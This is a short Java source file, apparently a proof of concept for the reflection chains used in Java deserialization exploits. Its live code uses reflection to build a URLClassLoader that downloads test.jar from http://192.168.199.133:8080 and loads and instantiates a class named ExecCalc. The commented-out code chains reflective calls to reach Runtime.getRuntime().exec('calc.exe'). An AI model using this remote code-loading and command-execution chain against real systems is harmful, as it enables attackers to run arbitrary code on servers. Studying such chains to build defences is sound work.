import java.io.File;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class Main {

    public static void main(String[] args) throws Exception {
        System.out.println("hello world");
        //File file = new File("test.jar");
        //URL url = file.toURI().toURL();
//        URL url1 = new URL("http://192.168.199.133:8080/test.jar");
//        URLClassLoader loader = new URLClassLoader(new URL[]{url1});
//        Class test = loader.loadClass("ExecCalc");
//        test.newInstance();
//        Class cls = Runtime.class;
//        System.out.println(cls);
//        System.out.println(cls.getClass());
//        System.out.println(Runtime.getRuntime().getClass());
//        Object object = Runtime.class;
//        Class cls = object.getClass();
//        Method method = cls.getMethod("getMethod", new Class[] {String.class, Class[].class });
//        object = method.invoke(object, new Object[] {"getRuntime", new Class[0] });
//        System.out.println(object);
//
//
//        cls = object.getClass();
//        System.out.println(cls);
//        method = cls.getMethod("invoke", new Class[] {Object.class, Object[].class });
//        object = method.invoke(object, new Object[] {null, new Object[0] });
//        System.out.println(object);
//
//
//        cls = object.getClass();
//        method = cls.getMethod("exec", new Class[] {String.class });
//        object = method.invoke(object, new Object[] {"calc.exe"});



        Object object = java.net.URLClassLoader.class;
        Class cls = object.getClass();
        System.out.println("--" + cls);
        Method method = cls.getMethod("getConstructor", new Class[] { Class[].class });
        object = method.invoke(object, new Object[] { new Class[] { java.net.URL[].class } });
        System.out.println(object);

        cls = object.getClass();
        System.out.println("--" + cls);
        method = cls.getMethod("newInstance", new Class[] { Object[].class });
        object = method.invoke(object, new Object[] { new Object[] { new java.net.URL[] { new java.net.URL("http://192.168.199.133:8080/test.jar") } } });
        System.out.println(object);

        cls = object.getClass();
        System.out.println("--" + cls);
        method = cls.getMethod("loadClass", new Class[] { String.class });
        object = method.invoke(object, new Object[] {"ExecCalc" });
        System.out.println(object);

        cls = object.getClass();
        System.out.println("--" + cls);
        method = cls.getMethod("getConstructor", new Class[] {Class[].class});
        object = method.invoke(object, new Object[] {null});
        System.out.println(object);

        cls = object.getClass();
        System.out.println("--" + cls);
        method = cls.getMethod("newInstance", new Class[] { Object[].class });
        object = method.invoke(object, new Object[] {null});
        System.out.println(object);


    }
}
